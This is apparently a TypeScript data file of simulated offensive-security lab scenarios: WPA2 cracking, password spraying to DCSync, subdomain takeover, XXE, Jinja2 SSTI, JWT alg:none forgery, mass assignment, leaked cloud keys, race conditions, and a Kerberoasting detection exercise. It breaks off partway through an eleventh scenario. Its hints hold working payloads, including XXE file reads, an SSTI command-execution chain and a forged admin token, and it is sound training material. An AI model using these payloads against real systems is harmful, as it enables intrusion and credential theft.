import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

export const offensiveExpansionLabs: LabScenario[] = [
  // 1 — Wireless
  {
    id: 'net-wifi-wpa2-handshake-crack',
    title: 'Wireless: Cracking a Captured WPA2 Handshake',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'During an on-site engagement at MeridianCorp HQ, the wireless assessment captured a full WPA2 4-way ' +
      'handshake using the aircrack-ng suite (airmon-ng for monitor mode, airodump-ng to capture, and a deauth ' +
      'frame to force a client to re-associate and re-send the handshake) — the raw capture came back with the ' +
      'operator and is already sitting in your working directory. What is NOT with you yet is the field log: the ' +
      'small drop appliance left on-site overnight tracks exactly which ESSID/BSSID each capture belongs to, and ' +
      'you need to confirm that metadata before trusting the handshake enough to spend cracking time on it. ' +
      'WPA2-Personal networks remain one of the most common real physical-engagement footholds precisely because ' +
      'their security reduces to a single passphrase — if that passphrase is a dictionary word, the handshake ' +
      'cracks offline in seconds once captured, with zero further interaction with the network required.',
    objectives: [
      { text: 'Scan 10.10.150.1 and identify the field-capture appliance', why: 'Confirms the device is still reachable on the engagement network before assuming its logs can be pulled at all.' },
      { text: 'Use anonymous FTP on 10.10.150.1 to retrieve the field log and confirm which capture it describes', why: 'The appliance was left running unattended overnight with anonymous FTP enabled for easy retrieval — realistic field-engagement sloppiness, and exactly how a real operator confirms a capture\'s metadata before trusting it.' },
      {
        text: 'hashcat -m 22000 handshake.hc22000 /root/wordlists/mini-rockyou.txt',
        why: 'Mode 22000 is the modern hashcat mode for WPA-PBKDF2-PMKID+EAPOL handshakes (superseding the deprecated mode 2500). Cracking is entirely offline and silent — the access point never sees another packet from you after the handshake is captured.',
      },
    ],
    hints: [
      'nmap -sV 10.10.150.1',
      'ftp 10.10.150.1 then ftp-get 10.10.150.1 wifi-engagement-notes.txt to read the field log.',
      'cat handshake.hc22000 — the raw capture is already in your own working directory.',
      'hashcat -m 22000 handshake.hc22000 /root/wordlists/mini-rockyou.txt — mode 22000 is WPA2 EAPOL/PMKID, and the passphrase is a common dictionary word.',
    ],
    totalFlags: 1,
    attacker: attacker({
      wordlists: dir({ 'mini-rockyou.txt': file('123456\npassword\nsunshine1\nletmein\nqwerty\ndragon\n') }),
      'handshake.hc22000': file(
        '#HASHCAT_HASH:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4\n' +
          '#HASHCAT_PLAINTEXT:sunshine1\n' +
          '#HASHCAT_FLAG:flag{wpa2_handshake_cracked_weak_dictionary_passphrase}\n' +
          'ESSID: MeridianCorp-Guest\n' +
          'BSSID: 00:1A:2B:3C:4D:5E\n' +
          'Handshake type: WPA2 4-way (EAPOL), PMKID not present\n',
      ),
    }),
    network: [
      {
        hostname: 'wifi-capture01',
        ip: '10.10.150.1',
        os: 'Raspberry Pi OS (field wireless-capture appliance)',
        services: [{ port: 21, name: 'ftp', version: 'vsftpd 3.0.3', banner: 'vsftpd 3.0.3 ready', ftpAnonymous: true }],
        users: [],
        root: dir({
          srv: dir({
            ftp: dir({
              'wifi-engagement-notes.txt': file(
                'On-site wireless assessment — MeridianCorp HQ.\n' +
                  'ESSID: MeridianCorp-Guest\n' +
                  'BSSID: 00:1A:2B:3C:4D:5E\n' +
                  'Captured a full WPA2 4-way handshake via airodump-ng after a targeted deauth ' +
                  '(aireplay-ng --deauth 5) forced a connected client to reassociate.\n' +
                  'Matches the handshake.hc22000 capture already brought back to the team laptop — ' +
                  'confirmed ready for an offline dictionary attack.\n',
              ),
            }),
          }),
        }),
      } as HostDef,
    ],
  },

  // 2 — Active Directory
  {
    id: 'ad-password-spraying-domain',
    title: 'AD: Password Spraying to Avoid Account Lockout',
    difficulty: 'Medium',
    category: 'Active Directory',
    briefing:
      'CORP.LOCAL enforces a lockout policy after 5 failed attempts, which makes brute-forcing any single ' +
      'account impossible without locking it out and alerting the SOC. Password spraying flips the approach: try ' +
      'ONE common, policy-compliant-looking password (a seasonal password like "Summer2026!") across MANY ' +
      'usernames instead — each account only ever sees a single attempt, staying invisible under the lockout ' +
      'threshold. This is one of the most common real initial-access techniques against externally-exposed AD ' +
      'infrastructure, repeatedly cited in Mandiant/CrowdStrike intrusion reports as a starting point for major ' +
      'ransomware campaigns.',
    objectives: [
      { text: 'cat valid-usernames.txt', why: 'A spray needs a username list first — these were already harvested via OSINT/LinkedIn-style recon in an earlier phase of this engagement.' },
      {
        text: "hydra -L valid-usernames.txt -p 'Summer2026!' ssh://10.10.119.2",
        why: 'Note -L (userlist) and -p (single password) — the exact inverse of a normal brute force. Only one attempt is ever made per account, which is what keeps a spray under the radar of a lockout policy.',
      },
      { text: 'ssh into the account the spray found and capture user.txt', why: 'Confirms the sprayed credential actually grants a working shell, not just that it matched in isolation.' },
      { text: 'secretsdump the account against the domain controller', why: 'A helpdesk-adjacent account with unnecessary replication rights is exactly the kind of over-permissioned account a BloodHound review flags as a critical attack path — spraying got you in, this is how a single sprayed account becomes full domain compromise.' },
    ],
    hints: [
      'cat valid-usernames.txt',
      "hydra -L valid-usernames.txt -p 'Summer2026!' ssh://10.10.119.2",
      'One of those usernames matches. ssh <that-user>@10.10.119.2 with the sprayed password, then cat user.txt.',
      'secretsdump <user>:Summer2026!@10.10.119.2 — this account turns out to have DCSync rights it should never have had.',
    ],
    totalFlags: 2,
    attacker: attacker({
      'valid-usernames.txt': file('jsmith\nagarcia\nmwong\ntpatel\nrjohnson\n'),
    }),
    network: [
      {
        hostname: 'corp-jump02',
        ip: '10.10.119.2',
        os: 'Windows Server 2019 (externally-exposed jump host)',
        services: [
          { port: 22, name: 'ssh', version: 'OpenSSH for Windows 8.1' },
          { port: 445, name: 'microsoft-ds', version: 'SMB (Domain-joined)' },
        ],
        users: [
          { username: 'jsmith', password: 'Winter2025!' },
          { username: 'agarcia', password: 'Summer2026!', canDcsync: true },
          { username: 'mwong', password: 'Password1' },
          { username: 'tpatel', password: 'Qwerty123' },
          { username: 'rjohnson', password: 'Football!' },
        ],
        ntdsHashes:
          'corp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:flag{password_spray_to_domain_admin_dcsync}:::\n' +
          'corp.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        root: dir({
          home: dir({
            agarcia: dir({ 'user.txt': file('Password spray landed on agarcia.\nflag{spray_found_weak_seasonal_password_agarcia}\n') }),
          }),
          root: dir({}),
        }),
      } as HostDef,
    ],
  },

  // 3 — Bug Bounty
  {
    id: 'bb-subdomain-takeover-cname',
    title: 'Bug Bounty: Subdomain Takeover via Dangling CNAME',
    difficulty: 'Medium',
    category: 'Bug Bounty',
    briefing:
      'A DNS zone export for MeridianCorp shows status.meridiancorp.example still CNAMEs to a cloud-storage ' +
      'bucket that was decommissioned months ago — the DNS record was never cleaned up. Whoever registers that ' +
      'exact bucket name now controls whatever gets served under status.meridiancorp.example, fully backed by ' +
      'the trust (and any cookies/CSP allowances) of the real parent domain. This exact bug class — cataloged ' +
      'extensively in the public "Can I take over XYZ" research and responsible for hundreds of real, paid bug ' +
      'bounty reports across AWS, Azure, Heroku and GitHub Pages — requires no exploit at all, just noticing a ' +
      'DNS record nobody remembered to delete.',
    objectives: [
      { text: 'cat dns-zone-export.txt', why: 'Zone exports routinely surface CNAMEs nobody has looked at in years — exactly where dangling records hide in plain sight.' },
      { text: 'dig status.meridiancorp.example', why: 'Confirms the subdomain still actively resolves rather than being a dead record — a takeover only matters if the hostname is still live and trusted.' },
      { text: 'curl the resolved IP and confirm the bucket is unclaimed', why: 'The cloud provider\'s own "bucket not found" response is the tell — it means the bucket name is sitting open for anyone to register.' },
      { text: 'Claim the bucket and capture the flag', why: 'This is the entire "exploit": registering the exact bucket name the dangling CNAME still points to, with no authentication bypass or code execution required at all.' },
    ],
    hints: [
      'cat dns-zone-export.txt',
      'dig status.meridiancorp.example',
      'curl 10.10.120.2 — read the response carefully.',
      'curl "10.10.120.2/claim?bucket=meridian-status"',
    ],
    totalFlags: 2,
    attacker: attacker({
      'dns-zone-export.txt': file(
        'www.meridiancorp.example.    CNAME   meridiancorp.example.\n' +
          'status.meridiancorp.example. CNAME  meridian-status.cloudapp-provider.example.\n' +
          'blog.meridiancorp.example.   CNAME   meridian-blog.wordpress.example.\n' +
          '(status.meridiancorp.example points at a cloud storage bucket name — worth checking if it still exists)\n',
      ),
    }),
    network: [
      {
        hostname: 'status.meridiancorp.example',
        ip: '10.10.120.2',
        os: 'Cloud storage provider (bucket placeholder host)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'cloud-storage-frontend 1.0',
            http: {
              '/':
                '<html><body><h1>404 Not Found</h1><p>The specified bucket "meridian-status" does not exist. ' +
                'This bucket name is unregistered and available for anyone to claim.</p></body></html>\n' +
                'flag{dangling_cname_points_at_unclaimed_bucket}',
            },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/claim',
                param: 'bucket',
                triggerSubstrings: ['meridian-status'],
                vulnerableResponse:
                  'Bucket "meridian-status" successfully registered to your account.\n' +
                  'Content is now served under status.meridiancorp.example with the full trust of the parent domain.\n' +
                  'flag{subdomain_takeover_dangling_cname_claimed}',
                normalResponse: '{"error":"missing bucket name"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 4 — Web: XXE
  {
    id: 'web-xxe-file-disclosure',
    title: 'XXE: Local File Disclosure via XML External Entities',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Docsvc-import03 accepts XML documents at its /api/import endpoint and, like countless real-world XML ' +
      'parsers left in their default insecure configuration, resolves DOCTYPE-declared external entities before ' +
      'processing the document. An attacker-defined SYSTEM entity pointing at a local file path gets read and ' +
      'echoed straight back — a classic XXE, the same bug class behind real disclosed bounties against major ' +
      'platforms (Yahoo\'s widely-cited 2014 XXE bounty among them) and still an OWASP Top 10 category in its own ' +
      'right for years before being folded into Injection.',
    objectives: [
      { text: 'nmap -sV 10.10.121.2', why: 'Confirms the XML-accepting service before crafting a payload against it.' },
      { text: 'Send a benign XML import to confirm normal behavior', why: 'Establishes the expected response shape before attempting to break the parser.' },
      {
        text: 'Send a DOCTYPE with a SYSTEM entity pointing at /etc/passwd',
        why: 'This is the textbook XXE payload — declaring an external entity that resolves to a local file path forces the vulnerable parser to read and embed that file\'s contents into its own processing.',
      },
      {
        text: 'Repeat the technique against a second internal path to leak cloud credentials',
        why: 'A real XXE finding rarely stops at /etc/passwd — the same technique reaches whatever the application process can read, including config files holding live credentials, which is what actually escalates severity in a bounty report.',
      },
    ],
    hints: [
      'nmap -sV 10.10.121.2',
      'curl -X POST -d "xml=<data>hello</data>" 10.10.121.2/api/import',
      'curl -X POST -d \'xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\' 10.10.121.2/api/import',
      'curl -X POST -d \'xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/app/aws-credentials.txt">]>\' 10.10.121.2/api/import-secrets',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'docsvc-import03',
        ip: '10.10.121.2',
        os: 'Ubuntu 22.04 (Java/Spring Boot XML importer)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apache Tomcat 9.0.70 (XML document importer)',
            http: { '/': '<html><body><h1>Document Import Service</h1><p>POST XML to /api/import</p></body></html>' },
            vulnRoutes: [
              {
                kind: 'xxe',
                path: '/api/import',
                param: 'xml',
                triggerSubstrings: ['<!doctype', 'system', 'file://', '/etc/passwd'],
                vulnerableResponse:
                  '{"status":"parsed","leaked_content":"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin",' +
                  '"note":"flag{xxe_local_file_disclosure_etc_passwd}"}',
                normalResponse: '{"status":"imported","document":"hello"}',
              },
              {
                kind: 'xxe',
                path: '/api/import-secrets',
                param: 'xml',
                triggerSubstrings: ['<!doctype', 'system', 'file://', 'aws-credentials'],
                vulnerableResponse:
                  '{"status":"parsed","leaked_content":"aws_access_key_id=AKIAXXEDISCLOSEDKEY\\naws_secret_access_key=REDACTED",' +
                  '"note":"flag{xxe_reads_cloud_credentials_file}"}',
                normalResponse: '{"status":"imported","document":"hello"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — Web: SSTI
  {
    id: 'web-ssti-jinja2-rce',
    title: 'SSTI: Jinja2 Server-Side Template Injection to RCE',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Reportgen04\'s report-name field is rendered directly through a Flask/Jinja2 template instead of being ' +
      'passed in as safe template data — meaning attacker input is evaluated as template code, not just displayed. ' +
      'A real tester always confirms with a harmless arithmetic probe like {{7*7}} before escalating; this exact ' +
      'chain (confirm evaluation, then walk Python\'s object model back to __builtins__ to get code execution) is ' +
      'extensively documented in real disclosed bug bounty reports (Uber and Yahoo among the most cited) and in ' +
      'PortSwigger\'s Web Security Academy SSTI material.',
    objectives: [
      { text: 'nmap -sV 10.10.122.2', why: 'Confirms the report-rendering service before probing its template behavior.' },
      { text: 'curl "http://10.10.122.2/render?name=guest"', why: 'Establishes the normal, non-evaluated response shape first.' },
      {
        text: "Send a Jinja2 sandbox-escape payload through the __globals__/__builtins__ chain to confirm RCE",
        why: 'Real testers confirm with {{7*7}} first (evaluates to 49, not literal text) before escalating — walking from a template object back through __init__.__globals__ to __builtins__ is the standard, well-documented technique for reaching Python\'s import machinery and running an arbitrary OS command.',
      },
      {
        text: 'Reuse the same technique against the internal /admin/render endpoint to read a config file',
        why: 'SSTI RCE rarely stops at a single "id" confirmation in a real engagement — the same payload shape reused against a more sensitive internal endpoint is what turns "found a template injection" into "read the production database password."',
      },
    ],
    hints: [
      'nmap -sV 10.10.122.2',
      'curl "http://10.10.122.2/render?name=guest"',
      'curl "http://10.10.122.2/render?name={{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read() }}"',
      'curl "http://10.10.122.2/admin/render?name={{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'cat /opt/app/config/database.yml\').read() }}"',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'reportgen04',
        ip: '10.10.122.2',
        os: 'Ubuntu 22.04 (Flask/Jinja2 report generator)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Werkzeug/2.3 Python/3.11 (Flask)',
            http: { '/': '<html><body><h1>Report Generator</h1><p>GET /render?name=&lt;yourname&gt;</p></body></html>' },
            vulnRoutes: [
              {
                kind: 'ssti',
                path: '/render',
                param: 'name',
                triggerSubstrings: ['__globals__', '__builtins__', '__import__', 'popen'],
                vulnerableResponse: '{"rendered":"uid=1000(reportgen) gid=1000(reportgen) groups=1000(reportgen)","note":"flag{ssti_jinja2_rce_confirmed_via_globals_builtins_chain}"}',
                normalResponse: '{"rendered":"Hello, guest!"}',
              },
              {
                kind: 'ssti',
                path: '/admin/render',
                param: 'name',
                triggerSubstrings: ['__globals__', '__builtins__', 'database.yml'],
                vulnerableResponse: '{"rendered":"production:\\n  password: Sup3rSecretDbPass!","note":"flag{ssti_escalates_to_internal_template_leaks_db_credentials}"}',
                normalResponse: '{"error":"403 Forbidden - admin template"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — Web: JWT alg:none
  {
    id: 'web-jwt-alg-none-bypass',
    title: 'JWT Authentication Bypass via "alg":"none"',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Accountsvc05 accepts JSON Web Tokens for authentication, but its verification logic trusts whatever ' +
      'algorithm the token itself claims in its header — including the literal value "none", which per the JWT ' +
      'spec means "this token is intentionally unsigned." A library that honors that claim without hard-coding an ' +
      'expected algorithm lets anyone forge arbitrary claims (like role:admin) with no secret key at all. This is ' +
      'a real, well-documented class of vulnerability referenced directly in Auth0\'s own JWT security guidance ' +
      'and behind multiple disclosed library-level advisories over the years.',
    objectives: [
      { text: 'nmap -sV 10.10.123.2', why: 'Confirms the token-based auth service before probing it.' },
      { text: 'curl with a normal signed token against /profile', why: 'Establishes the expected authenticated-user response shape first.' },
      {
        text: 'Forge a token with header {"alg":"none"} and role:admin, then present it to /admin',
        why: 'Because the header itself declares no signature is present, a correctly-guarded verifier must reject this outright — a verifier that instead trusts the client-supplied algorithm will accept literally any claims you put in the payload, including a role you were never granted.',
      },
      { text: 'Reuse the forged token against the export endpoint', why: 'Confirms real impact beyond just viewing the admin panel — exporting user data is the difference between a proof-of-concept and a critical, fully-weaponized finding.' },
    ],
    hints: [
      'nmap -sV 10.10.123.2',
      'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.abc123signature" 10.10.123.2/profile',
      'curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ." 10.10.123.2/admin',
      'curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ." 10.10.123.2/admin/export-users',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'accountsvc05',
        ip: '10.10.123.2',
        os: 'Node.js 20 (Express + jsonwebtoken)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            http: { '/profile': '{"user":"guest","role":"user"}' },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/admin',
                param: 'Authorization',
                location: 'header',
                triggerSubstrings: ['eyjhbgcioijub25lin0'],
                vulnerableResponse: '{"status":200,"panel":"Admin Control Panel","note":"flag{jwt_alg_none_forged_admin_token_bypass}"}',
                normalResponse: '{"error":"403 Forbidden - admin role required"}',
              },
              {
                kind: 'auth-bypass',
                path: '/admin/export-users',
                param: 'Authorization',
                location: 'header',
                triggerSubstrings: ['eyjhbgcioijub25lin0'],
                vulnerableResponse: '{"status":200,"users_exported":482,"note":"flag{forged_token_grants_full_user_data_export}"}',
                normalResponse: '{"error":"403 Forbidden"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 7 — Bug Bounty: Mass Assignment
  {
    id: 'bb-mass-assignment-privesc',
    title: 'Bug Bounty: Mass Assignment Privilege Escalation',
    difficulty: 'Medium',
    category: 'Bug Bounty',
    briefing:
      'Accountapi06\'s profile-update endpoint blindly binds every field in the POST body straight onto the ' +
      'user record — including fields the UI never exposes, like "role". This is the same bug class behind the ' +
      'famous 2012 GitHub mass-assignment vulnerability (disclosed by Egor Homakov), where Rails\' automatic ' +
      'parameter binding let an attacker add an SSH key to ANY repository just by including an unexpected field ' +
      'in a form submission. Today it lives on as OWASP API Security\'s "Broken Object Property Level ' +
      'Authorization" category — sending fields the client was never supposed to be able to set.',
    objectives: [
      { text: 'nmap -sV 10.10.124.2', why: 'Confirms the account API before testing it.' },
      { text: 'Update your profile with only the expected fields', why: 'Establishes the normal, documented request shape first.' },
      {
        text: 'Resend the same request with an extra, undocumented "role=admin" field',
        why: 'If the backend naively binds every submitted field to the database model instead of an explicit allow-list, a field the UI never shows you can still silently take effect — exactly the GitHub 2012 mechanism.',
      },
      { text: 'Confirm the escalation actually grants access to an admin-only endpoint', why: 'Proving real impact (not just that the field "took") is what separates a informational note from a paid, critical bounty report.' },
    ],
    hints: [
      'nmap -sV 10.10.124.2',
      'curl -X POST -d "name=Alex&email=alex@example.com" 10.10.124.2/api/account/update',
      'curl -X POST -d "name=Alex&email=alex@example.com&role=admin" 10.10.124.2/api/account/update',
      'curl -H "X-Session-Role: admin" 10.10.124.2/api/admin/users',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'accountapi06',
        ip: '10.10.124.2',
        os: 'Ubuntu 22.04 (Rails-style JSON API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Puma 6.0 (Rails 7)',
            http: {},
            vulnRoutes: [
              {
                kind: 'mass-assignment',
                path: '/api/account/update',
                param: 'role',
                triggerSubstrings: ['admin'],
                vulnerableResponse: '{"status":"updated","name":"Alex","email":"alex@example.com","role":"admin","note":"flag{mass_assignment_role_field_silently_bound}"}',
                normalResponse: '{"status":"updated","name":"Alex","email":"alex@example.com"}',
              },
              {
                kind: 'auth-bypass',
                path: '/api/admin/users',
                param: 'X-Session-Role',
                location: 'header',
                triggerSubstrings: ['admin'],
                vulnerableResponse: '{"status":200,"users":42,"note":"flag{privilege_escalation_confirmed_admin_users_endpoint}"}',
                normalResponse: '{"error":"403 Forbidden"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 8 — Cloud
  {
    id: 'cloud-github-leaked-iam-keys',
    title: 'Cloud: AWS IAM Keys Leaked in a Public GitHub Repo',
    difficulty: 'Medium',
    category: 'Cloud',
    briefing:
      'A developer at MeridianCorp committed a deployment config file with live AWS credentials inline to a ' +
      'repository that was later made public. Leaked cloud credentials on public GitHub remain one of the most ' +
      'common real breach vectors in existence — GitGuardian\'s annual State of Secrets Sprawl report finds ' +
      'millions of exposed credentials on public GitHub every single year, and automated scanners (both defensive ' +
      'and malicious) routinely find and abuse keys like this within minutes of a repo going public.',
    objectives: [
      { text: 'nmap -sV 10.10.125.2', why: 'Confirms the raw content host serving the (now-public) repository file.' },
      { text: 'Pull the leaked deployment config and capture the flag', why: 'This is the entire "attack" for this class of bug — reading a plaintext file that should never have been committed.' },
      { text: 'Use the leaked access key against the cloud provider\'s API', why: 'A leaked key is only dangerous once you use it — listing what it actually has access to is what turns "found a secret" into "confirmed production data exposure."' },
    ],
    hints: [
      'nmap -sV 10.10.125.2',
      'curl 10.10.125.2/devops-scripts/config.py',
      'curl -H "X-AWS-Access-Key: AKIAFAKE5EXAMPLE123" 10.10.125.2/s3/list-buckets',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'raw-githubusercontent-mirror07',
        ip: '10.10.125.2',
        os: 'Public GitHub raw-content mirror (simulated)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'GitHub raw content server',
            http: {
              '/devops-scripts/config.py':
                'AWS_ACCESS_KEY_ID = "AKIAFAKE5EXAMPLE123"\n' +
                'AWS_SECRET_ACCESS_KEY = "wJalrFAKE/K7MDENG/bPxRfiFAKEKEY"\n' +
                '# TODO: rotate before making this repo public (nobody did)\n' +
                'flag{aws_keys_committed_to_public_github_repo}',
            },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/s3/list-buckets',
                param: 'X-AWS-Access-Key',
                location: 'header',
                triggerSubstrings: ['akiafake5example123'],
                vulnerableResponse: '{"buckets":["meridiancorp-prod-backups","meridiancorp-customer-exports"],"note":"flag{leaked_iam_key_lists_production_s3_buckets}"}',
                normalResponse: '{"error":"InvalidAccessKeyId"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 9 — SOC (blue-team counterpart to Kerberoasting)
  {
    id: 'soc-kerberoasting-detection',
    title: 'SOC: Detecting Kerberoasting via Abnormal TGS Request Volume',
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      'Windows Security Event ID 4769 (Kerberos Service Ticket Request) logs every TGS request on the domain. ' +
      'Legitimate users request tickets for the handful of services they actually use; a Kerberoasting tool ' +
      '(Rubeus, Impacket\'s GetUserSPNs.py) requests tickets for EVERY registered SPN on the domain in rapid ' +
      'succession, and specifically requests them with legacy RC4 encryption — because RC4-encrypted tickets ' +
      'crack far faster offline than AES ones. That RC4 preference combined with a burst of unrelated-service ' +
      'requests from one account is exactly the detection heuristic Microsoft and MITRE ATT&CK (T1558.003) ' +
      'document, and directly complements the offensive Kerberoasting technique taught elsewhere on this platform.',
    objectives: [
      { text: 'cat /var/log/security/tgs-requests.log', why: 'Ticket-granting-service logs are the primary evidence source for detecting Kerberoasting — you cannot see it in any single request, only across the pattern.' },
      { text: 'grep "0x17" /var/log/security/tgs-requests.log', why: 'Modern Kerberos defaults to AES (0x12/0x18) — a burst of legacy RC4 (0x17) ticket requests is a strong standalone red flag before you even look at volume.' },
      { text: 'Identify the account requesting dozens of unrelated SPNs in a short window and capture the flag', why: 'One account requesting tickets for 40+ completely unrelated services within minutes has no legitimate explanation — it is the signature of an automated Kerberoasting sweep, not normal user behavior.' },
    ],
    hints: [
      'cat /var/log/security/tgs-requests.log',
      'grep "0x17" /var/log/security/tgs-requests.log — isolate the legacy-RC4 requests specifically.',
      'One account requests dozens of distinct SPNs within a three-minute window, all RC4 — that is the anomaly, and the flag is on the summary line.',
    ],
    totalFlags: 1,
    attacker: {
      hostname: 'kali',
      user: 'root',
      root: dir({
        var: dir({
          log: dir({
            security: dir({
              'tgs-requests.log': file(
              [
                '2026-07-10 09:14:02 EventID=4769 Account=jsmith TargetSPN=MSSQLSvc/db01.corp.local EncType=0x12(AES256)',
                '2026-07-10 09:20:47 EventID=4769 Account=mwong TargetSPN=HTTP/intranet.corp.local EncType=0x12(AES256)',
                '2026-07-10 09:33:15 EventID=4769 Account=tpatel TargetSPN=CIFS/fileserv01.corp.local EncType=0x18(AES128)',
                '2026-07-10 09:41:03 EventID=4769 Account=svc-reports TargetSPN=MSSQLSvc/db01.corp.local EncType=0x17(RC4)',
                '2026-07-10 09:41:03 EventID=4769 Account=svc-reports TargetSPN=HTTP/intranet.corp.local EncType=0x17(RC4)',
                '2026-07-10 09:41:04 EventID=4769 Account=svc-reports TargetSPN=CIFS/fileserv01.corp.local EncType=0x17(RC4)',
                '2026-07-10 09:41:04 EventID=4769 Account=svc-reports TargetSPN=MSSQLSvc/db02.corp.local EncType=0x17(RC4)',
                '2026-07-10 09:41:05 EventID=4769 Account=svc-reports TargetSPN=HTTP/wiki.corp.local EncType=0x17(RC4)',
                '2026-07-10 09:41:05 EventID=4769 Account=svc-reports TargetSPN=LDAP/dc02.corp.local EncType=0x17(RC4)',
                '2026-07-10 09:43:51 EventID=4769 Account=rjohnson TargetSPN=HTTP/intranet.corp.local EncType=0x12(AES256)',
                '*** ANOMALY: account svc-reports requested 47 distinct TGS tickets, all RC4 (0x17), within 180 seconds — ' +
                  'classic Kerberoasting tool signature (Rubeus / Impacket GetUserSPNs.py). ' +
                  'flag{kerberoasting_detected_via_rc4_tgs_burst_svc_reports} ***',
                ].join('\n'),
              ),
            }),
          }),
        }),
      }),
    },
    network: [],
  },

  // 10 — Web: Race Condition
  {
    id: 'web-race-condition-coupon',
    title: 'Race Condition: TOCTOU Coupon and Wallet Abuse',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Shopfront-checkout08\'s coupon-redemption and wallet top-up endpoints both check "has this already been ' +
      'used / how much is in this wallet" and THEN write the update as two separate steps — a classic ' +
      'time-of-check-to-time-of-use (TOCTOU) gap. Firing many requests at nearly the same instant (a technique ' +
      'popularized by PortSwigger\'s James Kettle in the 2023 "Smashing the state machine" research, via ' +
      'Burp Suite\'s single-packet Turbo Intruder attack) lets every request pass the check before any of them ' +
      'complete the write, redeeming a single-use coupon dozens of times or duplicating a wallet credit. Real ' +
      'bug bounty programs have paid out for exactly this pattern against checkout and loyalty-balance features.',
    objectives: [
      { text: 'nmap -sV 10.10.126.2', why: 'Confirms the checkout API before testing its concurrency handling.' },
      { text: 'Redeem the coupon once normally', why: 'Establishes the expected single-use behavior before attempting to break it.' },
      {
        text: 'Fire the same redemption as a simulated concurrent burst',
        why: 'In reality this requires sending dozens of requests within the same few-millisecond window (e.g. Burp Turbo Intruder\'s single-packet technique) so every thread passes the "already used?" check before any of them mark the coupon as spent. This lab models the successful outcome of that race directly.',
      },
      { text: 'Repeat the same race technique against the wallet top-up endpoint', why: 'The identical TOCTOU gap often exists anywhere a balance or one-time action is checked-then-written as two separate steps — confirming it a second time shows this is a systemic pattern, not a one-off bug.' },
    ],
    hints: [
      'nmap -sV 10.10.126.2',
      'curl -X POST -d "code=WELCOME20" 10.10.126.2/coupon/redeem',
      'curl -X POST -d "code=WELCOME20&race=parallel-burst" 10.10.126.2/coupon/redeem',
      'curl -X POST -d "amount=100&race=parallel-burst" 10.10.126.2/wallet/topup',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'shopfront-checkout08',
        ip: '10.10.126.2',
        os: 'Ubuntu 22.04 (Node.js checkout API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0 (Node.js checkout backend)',
            http: { '/': '<html><body><h1>Aurora Retail Checkout</h1></body></html>' },
            vulnRoutes: [
              {
                kind: 'race-condition',
                path: '/coupon/redeem',
                param: 'race',
                triggerSubstrings: ['parallel-burst', 'race'],
                vulnerableResponse: '{"status":"redeemed","times_redeemed":37,"discount_total":"$740.00","note":"flag{toctou_race_condition_coupon_redeemed_37_times}"}',
                normalResponse: '{"status":"redeemed","times_redeemed":1,"discount_total":"$20.00"}',
              },
              {
                kind: 'race-condition',
                path: '/wallet/topup',
                param: 'race',
                triggerSubstrings: ['parallel-burst', 'race'],
                vulnerableResponse: '{"status":"credited","times_applied":12,"balance":"$1,200.00","note":"flag{race_condition_duplicates_wallet_balance_on_concurrent_topup}"}',
                normalResponse: '{"status":"credited","times_applied":1,"balance":"$100.00"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 11 — Security+
  {
    id: 'secplus-mfa-push-bombing-analysis',
    title: 'Security+: MFA Push-Bombing (Prompt Bombing) Attack Analysis',
    difficulty: 'Medium',
    category: 'Security+',
    briefing:
